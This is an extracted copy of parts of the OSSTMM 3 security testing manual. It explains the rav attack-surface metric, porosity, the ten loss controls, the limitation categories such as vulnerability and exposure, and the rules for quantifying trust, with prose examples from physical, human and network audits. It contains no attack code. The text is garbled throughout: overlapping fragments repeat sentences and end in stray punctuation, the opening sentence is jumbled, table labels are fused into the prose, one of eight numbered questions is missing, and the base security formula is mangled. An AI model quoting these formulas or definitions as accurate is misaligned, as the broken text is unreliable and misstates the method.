In The ravs are like counting cells and classifying them by what they each operation of the cell’s duties the machine can do to determine how well the organism fits into an environment. determine what the cells limitations are. So if it was possible for the machine to also repair a problem in faulty cells directly, fortify the body by changing the process of the cells, or removing the unnecessary cells, we would be able to directly affect the health of the body as a whole with each change. Or perhaps we might change the environment that the body is exposed to instead of the cells to make more global changes. By subjecting the person to better nutrition, diet, or exercise we will also change the body on a cellular level. All this is possible by knowing how things work inside the body and what’s there in these operations. Unfortunately there is no such machine for counting all cells in a human body. However it does exist for security. Analysts can count and verify the operations of targets in a scope as if it is a super-organism. They record its interactions and the controls surrounding those interactions. They classify them by operation, resources, processes, and limitations. Those numbers the Analysts generate are combined so that controls add to operational security and limitations take away from it. Even the value of the limitations, how badly each type of problem hurts, is also not arbitrary because it’s based on the combination of security and controls within that particular scope. So a bad problem in a protective environment will provide less over-all exposure than one in a less controlled environment.

In that equation, risk is the result of an informed, however highly biased, equation. If we can remove most of the bias by knowing the level of protection and therefore the level of vulnerability impact, we can reduce the bias in that equation and give a much better risk assessment. Therefore, the rav is actually the factual foundation for a risk assessment where an Analyst has facts to work with. The real power of the rav however is how it can provide answers to the following eight fundamental security questions with great accuracy. 1. How much money should be spent on security? The rav will show the current amount of protection to make security projections and define milestones even before buying a particular solution or implementing some new process. From these projections and milestones, financial restrictions can be created",

The rav will show the current amount of protection to make security projections and define milestones even before buying a particular solution or implementing some new process. From these projections and milestones, financial restrictions can be created to meet the goals and get the most specific results from the investment. By knowing exactly what is controlled based on the current expenditure, you can also see what is not being controlled for that money. “More” then becomes that which is missing. It is then possible to forecast the cost of filling in the missing controls to achieve a perfect balance or at least a decidedly acceptable level of coverage. 2. What should be protected first? The rav can be used to see security as part of the big picture and as a macro lens on a particular part of a target, or any combination thereof. After analysis, the rav will show which particular part of the scope has the greatest porosity and the weakest controls. Comparing that to one’s needs and asset worth, a ratio of protection strength to value can be generated to decide exactly where to start. 3. What protection solutions do we need and how should we set them up for maximum effectiveness? A fully completed rav will show the 10 possible operational controls applied for each target and the limitations of those controls. You can then choose solutions based on which types of controls you want to put in place. The difference now is that you no longer need to look at a solution in terms of what it is rather than as the protection or controls it can provide. This allows you to view products for the controls you need to provide in the areas where controls are currently deficient. 4. How much improvement is gained by specific security procurements and processes? A key feature of the rav is that you can make a “Delta” by mapping out the benefits and limitations of a particular solution for comparison prior to procurement. This means you can see what changes that solution will make to the scope to compare with other solutions. Combining that map to a rav of the scope where the solution would be placed, the amount of improvement can be gauged even prior to purchase. You can even predict the value of that protection by dividing the price of the solution by the rav delta.

With regular audits, the rav can be recalculated and compared to the older value. Thereby the cost of new solutions and processes can be justified regularly as well as the cost of maintaining the current security level. 6. How do we know if we are reducing our exposure to our threats? With specific knowledge of your controls, you can easily tell what part or vector of the scope",

With specific knowledge of your controls, you can easily tell what part or vector of the scope is weak to specific and most unknown threats. In rav terminology, an unknown threat is just one that can appear where interactions exist but controls do not. Therefore a map can be drawn between the threats determined by the Risk Assessors and the controls in place. Regular metric reviews will show any change in this map and can be done so regularly. Then it is possible to gauge the cost each of those threats has on security by the expenditure on controls. 7. Can the rav tell us how well something resists attacks? Technically, yes. The more you can balance controls with interactions, the smaller the attack surface will be and the more capable the target will have to control known and unknown types of interactions. 8. Can the rav help me with regulatory compliance? Anything that helps you classify all controls and Access points in a scope will help you with compliance audits. The rav helps you do such a good job of getting your security under control that you may even find the major flaws in compliance regulations. While there is no particular compliance right now that asks you to have a particular rav score, showing the OSSTMM STAR with its rav score will help you meet various compliance requirements for a third-party audit and documentation.

Any security test can be used but the more thorough and accurate the test the more the conclusive the results will be. The rav was originally designed for operations tests, like the OSSTMM, where the auditor focuses on the behavior of the target rather than the configuration. However experiments show it is possible to apply the rav to non-operational tests as well such as in static code analysis to determine the level of software security and complexity or in physical security checklist audits to determine the level of protection a physical space will provide. The SCARE (Source Code Analysis Risk Evaluation) project does exactly this by applying the ravs to C source code. The simplicity of making a rav from a security test. The minimum rav is made by the calculation of porosity which are the holes in the scope. The problem with security metrics is generally in the determination of the assessors to count what they can’t possibly really know. This problem does not exist in the rav. You get what you know from what is there for a particular vector and you make no assumptions surrounding what is not there. You count all that which is visible",

You get what you know from what is there for a particular vector and you make no assumptions surrounding what is not there. You count all that which is visible and interactive outside of the scope and allows for unauthenticated interaction between other targets in the scope. That becomes the porosity. This porosity value makes the first of 3 parts of the final rav value. The next part is to account for the controls in place per target. This means going target by target and determining where any of the 10 controls are in place such as Authentication, Subjugation, Non-repudiation, etc. Each control is valued as 10% of a pore since each provides 1/10th of the total controls needed to prevent all attack types. This is because having all 10 controls for each pore is functionally the same as closing the pore provided the controls have no limitations. The third part of the rav is accounting for the limitations found in the protection and the controls. These are also known as “vulnerabilities”. The value of these limitations comes from the porosity and established controls themselves. With all counts completed, the rav is basically subtracting porosity and limitations from the controls. This is most easily done with the rav spreadsheet calculator. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 67\\nUnfortunately, an unskilled analyst can provide the wrong information which will translate into a bad rav. This is a possibility, just like it’s possible a carpenter doesn’t measure a board right or a mechanic fails to read the gauges right. The world is full of what-if scenarios. Therefore the rav is designed to be minimally influenced by bad auditing or cheating by eliminating the direct scope size from the metric calculation. However, no metric can be immune from fudging and the only way to assure the most accurate rav is to have multiple tests over time to make the counts and to be sure the auditor will take responsibility over the accuracy of the test. It is possible to take a short-cut in testing and still make a representative rav. If you don’t mind the error margin because you only want to make a quick comparison, you can just calculate the Porosity which means counting the visible and accessible targets. For example, those who run vulnerability scanners can count porosity and limitations relatively easily and assign default controls for discovered services. Analysts can also create a checklist which offers default controls for different common solutions found. These are all shortcuts to reduce the time to calculation but will affect the overall rav with an unknown, but perhaps acceptable, error margin. The end result is a calculation for Actual Security. It applies multiple controls of the same type to satisfy double-enforcement requirements like 2-factor Authentication. It also uses Log10 to reduce large numbers into human-manageable form. People generally like to work with smaller",

However, if you have a very large scope with many targets you may want to work with the very large numbers for greater accuracy. Additionally if you want to see the true balance where multiple controls of the same type are not measured, that calculation can be found under the heading of True Protection. Combining Channels and Vectors One important requirement in applying the rav is that Actual Security can only be calculated per scope. A change in channel, vector, or index is a new scope and a new calculation for Actual Security. However, once calculated, multiple scopes can be combined together in aggregate to create one Actual Security that represents a fuller vision of the operational security all scopes. For example, a test can be made of Internet-facing servers from both the Internet side and from within the perimeter network where the servers reside. That is 2 vectors. Assume that, the Internet vector is indexed by IP address and contains 50 targets. The intranet vector is indexed by MAC address and is made of 100 targets because less controls exist internally to allow for more collaborative interaction between systems. Once each test is completed and the rav is counted they can be combined into one calculation of 150 targets as well as the sums of each limitations and controls. This will give a final Actual Security metric which is more complete for that perimeter network than either test would provide alone. It would also be possible to add the analysis from physical security, wireless, telecommunications, and human security tests in the same way. Such combinations are possible to create a better understanding of the total security in a holistic way.

The number of targets in the scope that can be determined to exist by direct interaction, indirect interaction, or passive emanations is its visibility. As visibility is determined, its value represents the number of targets in the scope. Trust is any non-authenticated interaction to any of the targets. Access is the number of interaction points with each target. Category Description The number of targets in the scope. Count all targets by index only once and maintain the index consistently for all targets. It is generally unrealistic to have more targets visible than there are targets in the defined scope; however, it may be possible due to vector bleeds where a target which is normally not visible from one vector is visible due to a misconfiguration or 1 Visibility anomaly. A HUMSEC audit employs 50 people; however, only 38 of them are interactive from the test vector and channel. This would make a visibility of 38. This differs from visibility where one is determining the number of existing targets. Here, the auditor must count each Access per unique interaction point per unique probe. In a PHYSSEC audit, a building with 2 doors and 5 windows which all open has an Access of 7. If all the doors and windows are sealed, then it is an Access of 0 as these are not points where one can gain entry. For a COMSEC audit of data networks, the auditor counts each port response as an Access regardless of how many different ways the auditor can probe that port. However, if a service is not hosted at that port (daemon or an application), then all replies instead come from the IP Stack. Therefore, a server that responds with a SYN/ACK and service 2 Access interactivity to only one of the TCP ports scanned and with a RST to the rest does not have an Access count of 65536 (including port 0) since 66535 of the ports respond with the same response of RST from the kernel. To simplify, count only ports with service responses and only one IP Stack response regardless of the number of ports which can initiate this kind of interactivity. With HUMSEC audits, this is much more simplified. A person who responds to a query counts as an Access with all types of queries (all the different questions you may ask or statements made count as the same type of response on the same channel). Therefore, a person can only be an Access of 1 per channel and vector. Only a person who completely ignores the request by not acknowledging the channel is not counted.

If those doors are sealed then it is a Trust of 0 as these are not points where one can pass. 3 Trust For a COMSEC audit of data networks, the auditor counts each type of service forward or port forward as a Trust. With HUMSEC audits, a person who acts as a gateway to interact with other people or to access property is a trust per channel. Therefore, a person can only be a Trust of 1 per channel and vector. Only a person who does not comply to the Trust request is not counted.

Category Description Count each instance of authentication required to gain access. This requires that authorization and identification make up the process for the proper use of the authentication mechanism. 1 Authentication In a PHYSSEC audit, if both a special ID card and a thumb print scan is required to gain access, then add two for authentication. However, if Access just requires one or the other, then only count one. Count each instance of methods used to exact liability and insure compensation for all assets within the scope. A basic PHYSSEC example is a warning sign threatening to prosecute trespassers. Another common example is property insurance. In a scope 2 Indemnification of 200 computers, a blanket insurance policy against theft applies to all 200 and therefore is a count of 200. However, do not confuse the method with the flaw in the method. A threat to prosecute without the ability or will to prosecute is still an indemnification method-- however, it is with a limitation. Count each instance for Access or Trust in the scope which strictly does not allow for controls to follow user discretion or originate outside of itself. This differs from being a security limitation in the target since it applies to the design or implementation of controls. In a COMSEC data networks audit, if a log-in can be made in HTTP as well as HTTPS but requires the user to make that distinction, then it fails to count toward Subjugation. However, if the implementation requires the secured mode by default, such as a PKI internal messaging system, then it does 3 Subjugation meet the requirement of the Subjugation control for that scope. More simply, in HUMSEC, a non-repudiation process where the person must sign a register and provide an identification number to receive a document is under Subjugation controls when the provider",

Continuity is the umbrella term for characteristics such as survivability, load balancing, and redundancy. In a PHYSSEC audit, if it is discovered that an entry way into a store 4 Continuity becomes blocked such that no alternate entry way is possible and customers cannot enter, that Access does not have Continuity. In a COMSEC data networks audit, if a web server service fails from high- load and an alternate web server provides redundancy so no interactions are lost, this Access has Continuity. Count each instance for Access or Trust in the scope that does not fail open or provide new accesses upon security failure. In common language, to “fail securely”. In a PHYSSEC audit where 2 guards control Access to a door, if one is removed and the door cannot be opened by the remaining guard, then 5 Resilience it has resilience. In a COMSEC data networks audit, if a web service requiring a log-in or password loses communication with its authentication database, then all Access should be denied rather than permitted in order to have resilience. Count each instance for the Access or Trust that provides a non- repudiation mechanism for each interaction to provide assurance that the particular interaction did occur at a particular time between the identified parties. Non-repudiation depends upon identification and authorization to be properly established for it to be properly applied without limitations. In a PHYSSEC audit, the Non-repudiation control exists if the entrance to a building requires a camera with a biometric face scan to gain entry and each time it is used, the time of entry is recorded with the ID. However, if a key-card is used instead, the Non-repudiation control requires a 6 Non-repudiation synchronized, time-coded camera to assure the record of the card-user’s identity to avoid being a flawed implementation. If the door is tried without the key card, not having the synchronized camera monitoring the door would mean that not all interactions with the entryway have the Non-repudiation control and therefore does not count for this control. In a COMSEC data networks audit, there may be multiple log files for non- repudiation. A port scan interacting at the IP Stack is recorded in one log while interaction with the web service is recorded to another log file. However, as the web service",

A typical tool for Confidentiality is encryption. Additionally, obfuscation of 7 Confidentiality the content of an interaction is also a type of confidentiality, albeit a flawed one. In HUMSEC, however, a method of Confidentiality may include whispering or using hand signals. Count each instance for Access or Trust in the scope that provides the means to maintain the method of undisclosed interactions between the interacting parties. While “being private” is a common expression, the phrase is a bad example of privacy as a loss control because it includes elements of confidentiality. As a loss control, when something is done “in private” it means that only “the doing” is private but the content of the interaction may not be. A typical tool for Privacy is obscuring the interaction, that is, having the 8 Privacy interaction take place outside of the visibility of third parties. Confusion of the means of interaction as obfuscation is another method of applying the Privacy control. In HUMSEC, a method of Privacy may be simply taking the interaction into a closed room away from other people. In movies, we see techniques to create the Privacy control by setting two identical suitcases side by side, some type of incident to create confusion takes place, and the two people switch the suitcases in seemingly plain view. Count each instance for Access or Trust in the scope which can assure that the interaction process and Access to assets has finality and cannot be corrupted, stopped, continued, redirected, or reversed without it being known to the parties involved. Integrity is a change control process. In COMSEC data networks, encryption or a file hash can provide the Integrity control over the change of the file in transit. 9 Integrity In HUMSEC, segregation of duties and other corruption-reduction mechanisms provide Integrity control. Assuring integrity in personnel requires that two or more people are required for a single process to assure oversight of that process. This includes that no master Access to the whole process exists. There can be no person with full access and no master key to all doors.

The values of each Limitation are dependent on Porosity and Controls. This is different from the more common risk perspective where a vulnerability may be assigned a risk level based on what damage it can do, how easy it is to do, and the distance in range for the attack. Therefore the Limitation values are calculated based on the Porosity and Controls of the target they can be found on. Category Description Count separately each flaw or error that defies protections whereby a person or process can access, deny access to others, or hide itself or assets within the scope. In PHYSSEC, a vulnerability can be as simple as a glass door, a metal gate corroded by the weather, a door that can be sealed by wedging coins into the gap between it and its frame, electronic equipment not sealed from pests such as ants or mice, a bootable CD drive on a PC, or a process that allows an employee to take a trashcan large enough to hide or transport assets out of the scope. In HUMSEC, a vulnerability can be a cultural bias that does not allow an employee to question others who look out of place or a lack of training which leaves a new secretary to give out business information classified for internal use only. In COMSEC data security, a vulnerability can be a flaw in software that allows an attacker to overwrite memory space to gain access, a 1 Vulnerability computation flaw that allows an attacker to lock the CPU into 100% usage, or an operating system that allows enough data to be copied onto the disk until it cannot operate anymore.

In PHYSSEC, a weakness can be a door lock that opens when a card is wedged between it and the door frame, a back-up generator with no fuel, or insurance that doesn’t cover flood damage in a flood zone. In HUMSEC, a weakness can be a process failure of a second guard to take the post of the guard who runs after an intruder or a cultural climate within a company for allowing friends into posted restricted spaces. In COMSEC data security, a weakness can be a log-in that allows 2 Weakness unlimited attempts or a web farm with round-robin DNS for load balancing yet each system also has a unique name for direct linking. In COMSEC telecommunications, a weakness can be a PBX that still has the default administration passwords or a modem bank for remote access dial-in which does not log the caller numbers, time, and duration. In SPECSEC, a weakness can be a wireless access point authenticating users based on MAC addresses (which can be spoofed) or an RFID security tag that no longer receives signals and therefore fails “open” after receiving a signal from a high power source. Count each flaw or error in process controls: non-repudiation, confidentiality, privacy, integrity, and alarm. In PHYSSEC, a concern can be a door lock mechanism whose operation controls and key types are public, a back-up generator with no power meter or fuel gauge, an equipment process that does not require the employee to sign-out materials when received, or a fire alarm not loud enough to be heard by machine workers with ear plugs. In HUMSEC, a concern can be a process failure of a guard who maintains the same schedule and routine or a cultural climate within a company that allows employees to use public meeting rooms for internal business. 3 Concern In COMSEC data security, a concern can be the use of locally generated web server certificates for HTTPS or log files which record only the transaction participants and not the correct date and time of the transaction.

In PHYSSEC, an exposure can be a window which allows one to view assets and processes or a power meter that shows how much energy a building uses and its fluctuation over time. In HUMSEC, an exposure can be a guard who allows all visitors to view the list of names on the sign-in sheet or a company operator who informs callers that a particular person is out sick or on vacation. In COMSEC data security, an exposure can be a descriptive and valid 4 Exposure banner about a service (disinformation banners are not exposures) or an ICMP echo reply from a host. In COMSEC telecommunications, an exposure can be an automated company directory sorted alphabetically, allowing anyone to cycle through all persons and numbers, or a FAX machine that stores the last dialed numbers. In SPECSEC, an exposure can be a signal that disrupts other machinery or an infrared device whose operation is visible by standard video cameras with night capability. Count each unidentifiable or unknown element which cannot be accounted for in normal operations, generally when the source or destination of the element cannot be understood. An anomaly may be an early sign of a security problem. Since unknowns are elements which cannot be controlled, a proper audit requires noting any and all anomalies. In PHYSSEC, an anomaly can be dead birds discovered on the roof a building around communications equipment. In HUMSEC, an anomaly can be questions a guard asks which may seem 5 Anomaly irrelevant to either the job or standard small talk. In COMSEC data security, an anomaly can be correct responses to a probe from a different IP address than was probed or expected. In COMSEC telecommunications, an anomaly can be a modem response from a number that has no modem. In SPECSEC, an anomaly can be a local signal that cannot be properly located nor does it do any known harm.

It is initially measured as the sum of the scope’s visibility ( P ), access (P ),and V A trust (P ). T OpSec  P  P  P sum V A T When calculating the rav it is however necessary to determine the Operational Security base value, OpSec . The Operational Security base value is given by the equation base OpSec  log2 1100OpSec  . base sum Since the logarithm of 0 is not defined in the calculation we needed to include the 1+100 here. The log of 1 is 0. So if we have 0 Porosity and want to express this lack of interaction as perfect security of 100 rav then we needed to add +1 to the equation. Without the 1+100 we would have undefined numbers in the case that the sums of any of those factors are 0. This is required by the methodology because the absence of interactions represents perfect security and therefore the logarithm should equal 0 to provide the 100 rav. 4.5 The Controls Formula The next step in calculating the rav is to define the Loss Controls; the security mechanisms put in place to protect the operations. First the sum of the Loss Controls, LC , must be determined by adding together sum the 10 Loss Control categories.

The general public answers no to this question. One security professional answered, “Yes but only if everyone else has to take it too.” Trust can be both a problem and a solution. It is a problem where it puts security in a compromising position. Like the concept of potential energy in physics, trust creates a concentration of authorization which can explode into a big problem should the trust fail or the trusted target be deceived into harming the trust-giver. However it can also reduce the need for continuous, possibly redundant re-authentication, increasing the efficiency of operations. For that reason, trust is often seen as an “authenticate once and walk away” protocol. This is most often seen in Human Security where Human Resources departments research a candidate before the hire and afterward that person has continuous access to resources until they are no longer an employee. Re-authentication is then done seldom or sporadically and rarely at the same",

This is most often seen in Human Security where Human Resources departments research a candidate before the hire and afterward that person has continuous access to resources until they are no longer an employee. Re-authentication is then done seldom or sporadically and rarely at the same depth as when hired. In operational security, Trust is merely a contributor to porosity, just another interaction to control. It differs from Access (the other form of interaction), in how it relates to other targets within the scope. So where Access is interaction between two sides of a vector into and out of the scope, Trust is measured as the interactions between targets within the scope. However, most people don’t use trust so concretely. Trust is usually applied to a specific person or item and a specific act such as, “Can I trust this employee to deliver before the deadline?” or “Can I trust this computer?”. There are correct answers for these questions but people often lack the skills needed to quantify the level of Trust for that person or object which would let us make a more rational and logical decision. However, to quantify trust, we need to first understand it. 5.1 Understanding Trust Trust is a decision. While some people claim it is an emotion, like love, or a feeling, like pain, its clearly a complex quality we humans are born with. Unlike an emotion or a feeling, we can choose to trust or not to trust someone or something even if it feels wrong to do so. It appears that we are capable to rationalize in a way to supersede how we feel about trusting a target. This means we can quantify it by applying a logical process. It also means we can assign trust values to objects and processes as well as people based on these values. This brings new power to those who can analyze trust and make decisions based on that analysis. It also means Analysts with this skill can better control bias, identify fallacies (especially those from authoritative or trusted sources), and handle unknowns for transparent reporting. One point to note, however once the trust is quantified, it is only a vehicle for rationalizing the trust. It will not make something feel trustworthy now or in the future. Some people have strong feelings of aversion or attraction which may be at odds with the facts. As part of OpSec, trust is one part of a target’s porosity. Where security is like a wall that separates threats from assets, trust is a hole in that wall. It is wherever the target accepts interaction from other targets within the scope. However, people tend to use improper or incomplete operational controls with their trusts like authentication that has been made with improper identification such as a voice over a telephone, a business card, or even just the assumption that because a person is in the room that they are authorized to be there. This opens people",

This opens people up to fraud and deceit. The use of additional controls are required to secure a trust, to assure its integrity and resilience. Unfortunately, while using more controls works with objects and processes, it may not work between people. Many times social norms consider controls beyond simple authentication like matching a face or Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 87\\nvoice with an identity to be offensive to the person to be trusted. Society often requires us to be more trusting as individuals in order to benefit society as a whole and sometimes at the expense of everyone’s individual protection. As stated earlier, operational trust is measured as a negative thing which comes from an interaction between two entities in a scope. When a trust has no controls, it’s what people call “blind trust” which may be good for relationships and can speed interactions but is bad for operational security. People generally apply controls to trusts even if they don’t think of it as such at the time. Some controls are inherently given more weight than others depending on the situation and need. When selecting a person who they need to depend on, they may put a larger value on integrity and resilience. When making a financial transaction, they may put a larger value on authentication, continuity, and confidentiality. They may put a larger value on alarm and subjugation for advice on a product unless it’s a medical prescription then they would prefer privacy and non-repudiation. Realistically though, they are not actually giving more value to particular controls. Instead they are actually evaluating on the ten trust properties and looking for those specific controls for comfort to their trust decisions. Using the trust properties allows them to make a decision to trust or not even when the information they have about the target is incomplete. Since uninformed and unpracticed trust decision making is a dangerous gamble the very least a formal process like applying the trust properties can provide is to inform the decision maker of exactly how much they don’t know and allow them to seek more information before continuing. This means that the real need for being able to quantify operational trust occurs when we must rely on many unknowns to determine and rationalize trust. The trust properties are the quantifiable, objective elements which are used to create trust. We can say these properties are what we would say give us “reason to trust”. These properties are to be made into baseline rules based on the target and situation which we are verifying. Unfortunately, many illogical trust properties exist and are all too commonly in use which makes it more difficult for us to make proper trust decisions",

Many illogical methods for trust exist and are popularly used. Two examples of the most common, fallacious, trust properties are composability and transitivity. These properties are popularly used by people to make trust decisions about the unknown. In composability, a person makes a trust choice based on what a large number of people have to say about the thing or person in question even if those people aren’t individually trusted. Basically, a person accepts the group’s trusts as their own. This is similar to the pressure created by social or political groups and mass media. The reason why this is illogical is because the individual experiences of others, especially strangers, are all relative and cannot verify the consistent trustworthiness of future events. Common examples of fallacious trust use, first with Composability and secondly, with Transitivity. The other common fallacious use of trust is transitivity. It is when a person accepts the trust decision of a trusted person for themselves. It is also known as the chain of trust: you trust Alice and Alice trusts Jack therefore you can trust Jack. However, transitive trust is illogical as well because you may trust Alice for some things but perhaps not the same things for which she trusts Jack. There is also the possibility that Alice has approached the trust for some emotional benefit not available to you. People who often trust “their gut” to make trust decisions are lauded when they are right as if they have some secret, powerful sense above other humans. However, other than just luck, some people are better at paying attention to details, seeing emotional micro-expressions in faces, and applying logic quickly to common situations which they themselves might not be able to express verbally as to how but rather they do feel what’s wrong. These people learned to do this naturally and built upon it with experience filled with trial and error not really obvious to themselves any more than anyone notices the millions of small decisions they make each day and their consequences. The trust properties allow ordinary people who do not have this natural ability to analyze any of their trust decisions with skill, distancing themselves from their own under-developed “gut instinct” until they can recondition themselves to do",

Must the trust extend to just one or to many? Is the group to be a trusted one which is meant to make 1 Size collective decision? The vector (direction) of the trust. Trust may be one way (asymmetrical) and defined as to which way the trust must travel or 2 Symmetry both ways (symmetrical). A person who must also trust you has to consider the reciprocation from breaking the trust. The level of transparency of all operational parts and processes of the 3 Visibility target and its environment. Also called control, the amount of influence over the scope by the 4 Subjugation operator. The historical evidence of compromise or corruption of the target. 5 Consistency The amount and timely notice of change within the target. 6 Integrity The offsets of sufficient assurance are compensation for the trust giver or punishment for the trust breaker. It is a value placed on the trust 7 Offsets with the target. The financial offset for risk, the amount of win or gain for which the risk of putting trust in the target is sufficient to offset the risk of failure in the 8 Value trust. The number of other elements which currently provide resources for the target either through direct or indirect interactions, similar to 9 Components Intervention of the Four Point Process.

However, the properties on their own are useless if they cannot become quantifiable properties, objective, or understandable by the common person not necessarily involved in the security field. Therefore we still need to turn the trust properties into trust rules, calculations of directly relevant operations made from all the trust properties. We do this in the form of questions where the answers are unbiased numbers which will be used to create a percentage for easier comprehension and which matches our common use of qualifiers of trust in normal speech like almost, sometimes, always, and never. When creating the trust rules from the trust properties it is important to note that trust decisions are not linear. There is no building towards trust in a particular order or even an effort value system where it",

When creating the trust rules from the trust properties it is important to note that trust decisions are not linear. There is no building towards trust in a particular order or even an effort value system where it can be determined that one level requires more effort than another. In methodology terms, it appears irrational when calculated. A decision to trust therefore may be concluded by an answer from just one of the following tests which makes up the trust rules. However, doing so is our conscious choice to make a trust where the calculation specifically says not to. This may make most sense in a life or death situation where the result of trustworthiness is very low but the Value of Reward (one’s life) is so incredibly great that no other choice can be made. The trust rules must be created specifically for the target. While this may seem cumbersome, it is possible to make generically topic-specific trust rules which will suit the purpose. The benefit of this is that the trust properties can then be made into rules fitting any purpose and any situation where one must make a trust decision on another person, thing, process, system, or action. With practice, these trust rules can be made automatically and very quickly as part of one’s decision process, focusing only on the rules which can be answered and discovering the ones where there can be no known answer with the information available. The application of the trust rules into specific verification tests that provide a quantity is good however ideally you need to determine a finite quantity. An infinite quantity may be too relative to the tester and does not provide the constraints necessary for expressing the result in a percentage. For example, to apply the third property, transparency, the components should be counted as indexed so that there is a finite amount. So the parts of a computer can have an end number before the computer is completely built and a process can have a precise, finite number of steps before it is completed. For people, however, this may not be so easy to do but it is possible if applied properly to the situation. In the case of a security clearance, you may count all relationships within a given time range and of those, the number which are with people who have criminal records. This allows for a finite number even if rather large. Then, you may want to complete other tests specific to the third rule as that one may only give one type of influence. Others may be financial necessities, work experiences, memberships, convictions, and anything that will give a good representation as to how transparent that person is. The final calculation however has to be the sum total of all tests which will provide a single transparency percentage for that rule. The resulting percentage for each trust rule can be viewed individually",

The final calculation however has to be the sum total of all tests which will provide a single transparency percentage for that rule. The resulting percentage for each trust rule can be viewed individually to show where controls must be applied to improve or maintain necessary levels of trustworthiness. This may also show where improvements must be made before a trust can be considered. For example, a trust analysis for a costly and difficult military campaign may show that rule four, subjugation, is at 10% because some of the necessary participants are civilians and not under military control. This gives the theater operators of the campaign specific, actionable information to make the necessary adjustments to get that percentage up to a level that’s acceptable or else apply more controls to better assure compliance from those civilian members. Another result from analyzing the percentages of individual trust rules is that unknowns become glaringly Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 91\\nobvious because the less that is known, the lower the percentage will be. This means unknowns will be at or very close to 0%. The end metric however is one which is the mean of all percentages. This provides a big picture understanding you could rationally have of the target of the trust. This is especially useful when it is difficult to make a trust decision because of personal bias. Use of trust rules in formal security analysis as well as regular decision making can greatly minimize bias and mistakes. Therefore, the Analyst should be practiced in this skill so as to be able to apply them quickly so that it can be used even in high-pressure or emergency situations where a snap decision is necessary and a wrong decision is tragedy. Example Trust Rules This is a sample of generic trust rules anyone can employee to make better hiring decisions beyond that of just the technical qualification of the applicant. It follows the 10 trust properties. The goal is to make quantifiable questions which can be answered for each of the properties and applied by any person and on any potential new hire. Solid trust rules allows for consistency in quality rather than relying on the “gut instinct” of the gate keepers who need to make the trust decisions. 1. Size: 1.1.

This is determined with the use of the Trust Rules during security testing. Security management and policy creation is generally based on risk which defines the permissible interactions within and throughout an organization. This method essentially defines rules for users and configurations for systems which will provide the required level of protection when followed. The policy may also dictate how to handle problems which can occur should the rules or configurations be insufficient or not properly followed. Therefore the security policy will outline what the organization determines as trustworthy or not and which operational trusts will be allowed. However to test operational trust as established by the security policy is not security testing and it will not help an organization better determine where its protection is limited. Security testing against a particular policy to assure the rules are followed is called compliance testing and it is not the same as security testing. The use of the OSSTMM audit will determine the existing operational trusts whether or not they are acknowledged within the security policy. These findings subjected to trust analysis where the Trust Rules have been applied on people, systems, and processes will provide a precise measurement of where controls need to be. This can then be compared to the security policy to find the deficiencies that impact current protection measures as well as future security plans. Ultimately the Analyst would use trust metrics in place of risk analysis for a more accurate means of protecting a scope.

The posture is the culture, rules, norms, contracts, legislation, and policies defining the target. It ends with result comparisons to any alarms, alerts, reports, or access logs. This is a full-circle concept where the first step is to be aware of the operational requirements for interacting with the target, and the last step is the review of the records of the audit trail. For the Analyst, this is simply: you know what you need to do, you do it, and then you check what you have done. This methodology separates what needs to be done",

For the Analyst, this is simply: you know what you need to do, you do it, and then you check what you have done. This methodology separates what needs to be done into this hierarchical format: 1. CHANNEL 2. MODULE 3. TASK The work is described in the module description for each particular channel audit. Some audits apply to technologies which may straddle the border between two or more channels. For example, commonly found wireless LANs must be tested under both the Data Networks channel and the Wireless channel. This is why a properly defined testing plan is so important. Channel hybridization is a constant and should not be overlooked. The OSSTMM is fully capable of a “sidewalk to kernel” security review and therefore is completely capable of applying an analysis to a target whether its channels are clearly distinct and separate or comprised of multiple channels. Therefore, for all targets, the Analyst should anticipate the need to define an audit to include multiple channels. Sometimes only under investigation will it become evident whether the scope contains any targets under a particular channel or if the Analyst will miss targets only available under other channels. This methodology applies to all five channels. It has 17 modules and all the same properties apply to all five channels. While the methodology itself may be the same, each channel differs in tasks. Each module has an input and an output. The input is the information used in performing each task. The output is the result of completed tasks. This output may or may not be intelligence (analyzed data) to serve as an input for another module and this output may further serve as the input for more than one module or section. Therefore, failure to complete certain modules or tasks may limit the successful completion of other modules or tasks. This would limit the thoroughness of the audit far more than just an accounting for the missing tasks would reveal. Some tasks yield no output, meaning that modules will exist for which there is no input. Modules which have no input can be ignored during testing but must be later documented with an explanation for not having been performed. Also, tasks with no output do not necessarily indicate an inferior test; rather, they may indicate superior security. In detail, tasks that have no resulting output can mean any of five things: 1. The channel was obstructed in some way during the performance of the tasks. 2. The tasks were not properly performed. 3. The tasks were not applicable. 4. The task result data has been improperly analyzed. 5. The task reveals superior security. It is important that impartiality and open-mindedness exist in performing the tasks of each module. The primary tenet for auditing states, in similar regard to a conformational bias: “When one searches for something, one expects to find it, which may lead you",

Therefore, each task gives a direction of what should be revealed to move to another point within the methodology. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 96\\nA previous trust analysis may be incorporated to determine scope according to vector and channel. A trust analysis can also be used to predetermine which modules need to be performed as independent tests. However, remember that modules are parts of a whole test and the assumption that any particular module can just be omitted is false and will lead to an improper test. If there is no input for a particular module though, it may be omitted without degrading the quality of the test. The difference is that, in the first case, the module or task is ignored based on a trust decision while in the second the test itself dictated that the module or task cannot be performed. With the provision of testing as a service, it is important to communicate to the target owner exactly what of the scope has not or will not be tested. This manages expectations and potentially inappropriate risk assurances in the security of a system. Testing time with the modules is relative to the plan. For example, if the Analyst tests the physical security of a door, then the test would have at least two vectors: the door’s functional security from the outside of the room to the inside, and then from the inside of the room to the outside. Determining the proper scope based on the vector is important because there may still be targets outside of the vector and still within the scope which will not make up the current testing scope. Overall, larger scopes with multiple channels and multiple vectors require more time spent on each module and its tasks. The amount of time allowed before returning with output data is not determined by this methodology and depends on the Analyst, the target, the test environment, and the test plan. 6.1 Methodology Flow The OSSTMM does not allow for a separation between what is considered active data collection and verification through agitation; because, in both cases, interaction is required. Nor does it differentiate between active and passive testing where active testing is the agitation to create an interaction with the target and passive testing is the recording, aggregation, and analysis of emanations from the target. This methodology requires both active and passive tests. Furthermore, the Analyst may not be able to differentiate between data collected passively from emanations of the operations and that",

